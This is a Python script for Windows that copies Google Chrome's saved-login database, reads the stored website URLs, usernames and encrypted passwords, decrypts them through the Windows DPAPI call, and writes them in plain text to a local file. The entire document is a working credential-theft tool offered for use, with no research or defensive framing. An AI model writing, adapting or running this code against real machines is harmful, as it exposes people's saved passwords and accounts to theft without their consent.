import os  # For interacting with the operating system (getting file paths)
import sqlite3  # For interacting with the SQLite database
import win32crypt  # For decrypting the stored passwords (Windows only)
import shutil  # For copying database to avoid locking issues

# Define the path to the Chrome login data SQLite database
data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Create a backup of the database file to avoid locking issues
temp_data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data Temp"
shutil.copyfile(data_path, temp_data_path)

# Establish a connection to the SQLite database
try:
    connection = sqlite3.connect(temp_data_path)
    print("[>] Connected to the database.")
except sqlite3.Error as e:
    print(f"[!] Failed to connect to the database: {e}")
    exit(1)

# Create a cursor object to interact with the database
cursor = connection.cursor()

# Execute an SQL query to fetch the URLs, usernames, and encrypted passwords
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    final_data = cursor.fetchall()  # Fetch all the results from the executed query
    print(f"[>] Found {len(final_data)} passwords.")
except sqlite3.Error as e:
    print(f"[!] Failed to execute the SQL query: {e}")
    connection.close()
    exit(1)

# Open a file to write the extracted data
with open("chrome_passwords.txt", "w") as a:
    a.write("Extracted Chrome passwords:\n")
    
    # Iterate through the fetched data from the database
    for website_data in final_data:
        try:
            # Decrypt the password using the Windows API
            password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1].decode('utf-8')
        except Exception as e:
            print(f"[!] Failed to decrypt password for {website_data[0]}: {e}")
            continue

        # Format the data for each website
        one = "Website  : " + str(website_data[0])
        two = "Username : " + str(website_data[1])
        three = "Password : " + str(password)

        # Write the extracted information to the file
        a.write(one + "\n" + two + "\n" + three + "\n")
        a.write("\n" + "==" * 20 + "\n")  # Add a separator between entries

    print(f"[>] Decrypted {len(final_data)} passwords.")
    print("[>] Data written to chrome_passwords.txt")

# Close the connection to the database
connection.close()

# Clean up the temporary database file
os.remove(temp_data_path)
